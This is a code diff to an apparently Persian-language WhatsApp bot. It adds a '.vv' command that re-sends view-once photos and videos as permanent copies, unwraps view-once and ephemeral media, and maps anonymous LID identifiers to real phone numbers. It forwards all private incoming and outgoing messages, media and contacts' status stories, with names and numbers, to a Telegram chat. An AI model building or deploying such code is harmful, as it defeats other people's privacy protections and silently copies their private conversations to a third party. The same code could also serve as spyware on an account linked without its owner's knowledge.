@@ -37,6 +37,7 @@ const activeSockets = new Map();
 const presenceTimers = new Map();
 const teachStates = new Map();
 const contactNames = new Map();
+const lidToPhone = new Map();
 
 const DEFAULT_REPLIES = {
     'سلام': 'سلام',
@@ -51,6 +52,7 @@ const DEFAULT_REPLIES = {
         '📌 دستورات:',
         '• .Shahid — یاد دادن جواب جدید',
         '• .Shahid <متن> — انتخاب متن برای یادگیری جواب',
+        '• .vv — باز کردن قفل عکس/ویدیوی ریپلای‌شده',
         '• .menu — نمایش منو'
     ].join('\n')
 };
@@ -78,10 +80,53 @@ function saveReplies(repliesObj) {
 
 let autoReplies = loadReplies();
 
+function normalizeDigits(val = '') {
+    return String(val).split('@')[0].split(':')[0].replace(/[^0-9]/g, '');
+}
+
+function registerContactMapping(entry) {
+    if (!entry) return;
+
+    const id = entry.id || entry.key?.remoteJid || entry.key?.participant || entry.participant || '';
+    const alt = entry.lid || entry.key?.remoteJidAlt || entry.key?.participantAlt || entry.alt || '';
+    const pn = entry.pn || entry.phoneNumber || '';
+
+    const idDigits = normalizeDigits(id);
+    const altDigits = normalizeDigits(alt);
+    const pnDigits = normalizeDigits(pn);
+
+    if (id.endsWith('@s.whatsapp.net') && idDigits && altDigits) {
+        lidToPhone.set(altDigits, idDigits);
+    }
+    if (alt.endsWith('@s.whatsapp.net') && altDigits && idDigits) {
+        lidToPhone.set(idDigits, altDigits);
+    }
+    if (pnDigits && altDigits) {
+        lidToPhone.set(altDigits, pnDigits);
+    }
+    if (pnDigits && idDigits && id.endsWith('@lid')) {
+        lidToPhone.set(idDigits, pnDigits);
+    }
+}
+
 function extractPhoneFromJid(jid = '') {
     if (!jid) return 'نامشخص';
-    const userPart = jid.split('@')[0].split(':')[0];
-    return userPart || 'نامشخص';
+    const digits = normalizeDigits(jid);
+    if (!digits) return 'نامشخص';
+
+    if (jid.endsWith('@s.whatsapp.net')) {
+        return digits;
+    }
+
+    if (lidToPhone.has(digits)) {
+        return lidToPhone.get(digits);
+    }
+
+    if (jid.endsWith('@lid')) {
+        return `${digits} (LID)`;
+    }
+
+    return digits;
 }
 
 function resolveDisplayName(jid, pushName) {
@@ -95,7 +140,110 @@ function resolveDisplayName(jid, pushName) {
     return 'بدون نام';
 }
 
-function extractTextFromMessage(message) {
+function unwrapMessage(message) {
+    if (!message) return null;
+    if (message.viewOnceMessage?.message) {
+        return unwrapMessage(message.viewOnceMessage.message);
+    }
+    if (message.viewOnceMessageV2?.message) {
+        return unwrapMessage(message.viewOnceMessageV2.message);
+    }
+    if (message.viewOnceMessageV2Extension?.message) {
+        return unwrapMessage(message.viewOnceMessageV2Extension.message);
+    }
+    if (message.ephemeralMessage?.message) {
+        return unwrapMessage(message.ephemeralMessage.message);
+    }
+    if (message.documentWithCaptionMessage?.message) {
+        return unwrapMessage(message.documentWithCaptionMessage.message);
+    }
+    return message;
+}
+
+function getQuotedMessage(msg) {
+    const unwrapped = unwrapMessage(msg?.message);
+    const contextInfo =
+        unwrapped?.extendedTextMessage?.contextInfo ||
+        unwrapped?.imageMessage?.contextInfo ||
+        unwrapped?.videoMessage?.contextInfo ||
+        unwrapped?.audioMessage?.contextInfo ||
+        unwrapped?.documentMessage?.contextInfo ||
+        msg?.message?.extendedTextMessage?.contextInfo ||
+        null;
+
+    if (!contextInfo || !contextInfo.quotedMessage) return null;
+
+    const quotedInner = unwrapMessage(contextInfo.quotedMessage);
+    if (!quotedInner) return null;
+
+    return {
+        key: {
+            remoteJid: msg.key.remoteJid,
+            fromMe: contextInfo.participant === msg.key.participant ? msg.key.fromMe : false,
+            id: contextInfo.stanzaId,
+            participant: contextInfo.participant
+        },
+        message: quotedInner
+    };
+}
+
+async function handleUnlockViewOnce(sock, remoteJid, msg, body) {
+    if (body.toLowerCase() !== '.vv') return false;
+
+    const quoted = getQuotedMessage(msg);
+    if (!quoted || !quoted.message) {
+        await sock.sendMessage(
+            remoteJid,
+            { text: '⚠️ لطفاً روی یک عکس یا ویدیوی قفل‌شده ریپلای کنید و .vv بزنید.' },
+            { quoted: msg }
+        );
+        return true;
+    }
+
+    const qMsg = quoted.message;
+    const isImage = Boolean(qMsg.imageMessage);
+    const isVideo = Boolean(qMsg.videoMessage);
+
+    if (!isImage && !isVideo) {
+        await sock.sendMessage(
+            remoteJid,
+            { text: '⚠️ پیام ریپلای‌شده عکس یا ویدیو نیست.' },
+            { quoted: msg }
+        );
+        return true;
+    }
+
+    try {
+        const buffer = await downloadMediaMessage(quoted, 'buffer', {});
+        if (isImage) {
+            const caption = qMsg.imageMessage.caption || `🔓 قفل عکس باز شد (${BOT_NAME})`;
+            await sock.sendMessage(
+                remoteJid,
+                { image: buffer, caption },
+                { quoted: msg }
+            );
+        } else if (isVideo) {
+            const caption = qMsg.videoMessage.caption || `🔓 قفل ویدیو باز شد (${BOT_NAME})`;
+            await sock.sendMessage(
+                remoteJid,
+                { video: buffer, caption },
+                { quoted: msg }
+            );
+        }
+    } catch (err) {
+        console.error('Unlock .vv error:', err.message);
+        await sock.sendMessage(
+            remoteJid,
+            { text: '❌ امکان باز کردن قفل این رسانه وجود نداشت (ممکن است منقضی شده باشد).' },
+            { quoted: msg }
+        );
+    }
+
+    return true;
+}
+
+function extractTextFromMessage(rawMessage) {
+    const message = unwrapMessage(rawMessage);
     if (!message) return '';
     return (
         message.conversation ||
@@ -109,13 +257,13 @@ function extractTextFromMessage(message) {
         (message.videoMessage ? '[ویدیو]' : '') ||
         (message.audioMessage ? '[صوت / ویس]' : '') ||
         (message.stickerMessage ? '[استیکر]' : '') ||
-        (message.documentMessage ? '[فایل]' : '') ||
+        (message.documentMessage ? `[فایل: ${message.documentMessage.fileName || 'document'}]` : '') ||
         ''
     ).trim();
 }
 
 async function sendTelegramMessage(text) {
-    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
+    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID || !text) return;
     try {
         await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
             method: 'POST',
@@ -130,43 +278,54 @@ async function sendTelegramMessage(text) {
     }
 }
 
-async function sendTelegramMedia(msg, caption) {
-    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-        return sendTelegramMessage(caption);
-    }
+async function sendTelegramMediaOrText(msg, caption) {
+    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
 
-    const m = msg.message || {};
-    const isImage = Boolean(m.imageMessage);
-    const isVideo = Boolean(m.videoMessage);
+    const innerMessage = unwrapMessage(msg.message) || {};
+    const isImage = Boolean(innerMessage.imageMessage);
+    const isVideo = Boolean(innerMessage.videoMessage);
 
     if (!isImage && !isVideo) {
         return sendTelegramMessage(caption);
     }
 
     try {
-        const buffer = await downloadMediaMessage(msg, 'buffer', {});
+        const mediaMsg = {
+            ...msg,
+            message: innerMessage
+        };
+        const buffer = await downloadMediaMessage(mediaMsg, 'buffer', {});
         const formData = new FormData();
         formData.append('chat_id', TELEGRAM_CHAT_ID);
         formData.append('caption', caption);
 
         if (isImage) {
-            const blob = new Blob([buffer], { type: 'image/jpeg' });
-            formData.append('photo', blob, 'story.jpg');
-            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+            const mimeType = innerMessage.imageMessage.mimetype || 'image/jpeg';
+            const ext = mimeType.includes('png') ? 'png' : 'jpg';
+            const blob = new Blob([buffer], { type: mimeType });
+            formData.append('photo', blob, `photo.${ext}`);
+            const resp = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                 method: 'POST',
                 body: formData
             });
+            if (!resp.ok) {
+                throw new Error(`sendPhoto HTTP ${resp.status}`);
+            }
         } else if (isVideo) {
-            const blob = new Blob([buffer], { type: 'video/mp4' });
-            formData.append('video', blob, 'story.mp4');
-            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
+            const mimeType = innerMessage.videoMessage.mimetype || 'video/mp4';
+            const blob = new Blob([buffer], { type: mimeType });
+            formData.append('video', blob, 'video.mp4');
+            const resp = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
                 method: 'POST',
                 body: formData
             });
+            if (!resp.ok) {
+                throw new Error(`sendVideo HTTP ${resp.status}`);
+            }
         }
     } catch (err) {
         console.error('Telegram media send error:', err.message);
-        await sendTelegramMessage(caption);
+        await sendTelegramMessage(`${caption}\n⚠️ (ارسال فایل رسانه‌ای ناموفق بود، متن گزارش ارسال شد)`);
     }
 }
 
@@ -303,6 +462,17 @@ async function handleTeachCommand(sock, remoteJid, msg, body) {
 function attachEvents(sock, number, sessionFolder) {
     sock.ev.on('contacts.upsert', (contacts) => {
         for (const c of contacts) {
+            registerContactMapping(c);
+            const name = c.notify || c.name || c.verifiedName;
+            if (c.id && name) {
+                contactNames.set(c.id, name);
+            }
+        }
+    });
+
+    sock.ev.on('contacts.update', (contacts) => {
+        for (const c of contacts) {
+            registerContactMapping(c);
             const name = c.notify || c.name || c.verifiedName;
             if (c.id && name) {
                 contactNames.set(c.id, name);
@@ -351,11 +521,14 @@ function attachEvents(sock, number, sessionFolder) {
         const msg = messages[0];
         if (!msg || !msg.message) return;
 
+        registerContactMapping(msg);
+
         const remoteJid = msg.key.remoteJid;
         if (!remoteJid) return;
 
         const body = extractTextFromMessage(msg.message);
 
+        // ۱) استوری‌های واتساپ
         if (remoteJid === 'status@broadcast') {
             const authorJid = msg.key.participant || msg.participant || '';
             const authorPhone = extractPhoneFromJid(authorJid);
@@ -369,53 +542,59 @@ function attachEvents(sock, number, sessionFolder) {
                 `📝 محتوا: ${storyText}`
             ].join('\n');
 
-            await sendTelegramMedia(msg, storyCaption);
+            await sendTelegramMediaOrText(msg, storyCaption);
             return;
         }
 
+        // نادیده گرفتن گروه‌ها
         if (remoteJid.endsWith('@g.us')) return;
 
+        // جلوگیری از لوپ روی پیام‌های خود ربات
         const isBotEcho =
             msg.key.fromMe &&
             (body.startsWith('✅') ||
                 body.startsWith('╔') ||
                 body.startsWith('برای کدام متن') ||
                 body.startsWith('برای این چی') ||
-                body.startsWith('✅ ذخیره شد'));
+                body.startsWith('✅ ذخیره شد') ||
+                body.startsWith('🔓 قفل'));
         if (isBotEcho) return;
 
         const targetPhone = extractPhoneFromJid(remoteJid);
         const targetName = resolveDisplayName(remoteJid, msg.key.fromMe ? '' : msg.pushName);
 
+        // ۲) اگر خودتان به کسی پیام دادید
         if (msg.key.fromMe) {
             if (body) {
-                await sendTelegramMessage(
-                    [
-                        '📤 پیام ارسال‌شده توسط شما در واتساپ',
-                        `👤 نام مخاطب: ${targetName}`,
-                        `📞 شماره مخاطب: ${targetPhone}`,
-                        `💬 پیام: ${body}`
-                    ].join('\n')
-                );
+                const outgoingText = [
+                    '📤 پیام ارسال‌شده توسط شما در واتساپ',
+                    `👤 نام مخاطب: ${targetName}`,
+                    `📞 شماره مخاطب: ${targetPhone}`,
+                    `💬 پیام: ${body}`
+                ].join('\n');
+
+                await sendTelegramMediaOrText(msg, outgoingText);
             }
 
             const lowerRaw = body.toLowerCase();
             const isTeachFlow =
                 lowerRaw === '.shahid' ||
                 lowerRaw.startsWith('.shahid ') ||
+                lowerRaw === '.vv' ||
                 teachStates.has(remoteJid);
 
             if (!isTeachFlow) return;
         } else {
+            // ۳) اگر کسی به شما پیام داد
             if (body) {
-                await sendTelegramMessage(
-                    [
-                        '📩 پیام جدید در واتساپ',
-                        `👤 نام: ${targetName}`,
-                        `📞 شماره: ${targetPhone}`,
-                        `💬 پیام: ${body}`
-                    ].join('\n')
-                );
+                const incomingText = [
+                    '📩 پیام جدید در واتساپ',
+                    `👤 نام: ${targetName}`,
+                    `📞 شماره: ${targetPhone}`,
+                    `💬 پیام: ${body}`
+                ].join('\n');
+
+                await sendTelegramMediaOrText(msg, incomingText);
             }
         }
 
@@ -425,6 +604,12 @@ function attachEvents(sock, number, sessionFolder) {
             await sock.sendPresenceUpdate('available', remoteJid);
             await sock.sendPresenceUpdate('composing', remoteJid);
             await delay(300);
+
+            const unlocked = await handleUnlockViewOnce(sock, remoteJid, msg, body);
+            if (unlocked) {
+                await sock.sendPresenceUpdate('paused', remoteJid);
+                return;
+            }
 
             const handledTeach = await handleTeachCommand(sock, remoteJid, msg, body);
             if (!handledTeach) {
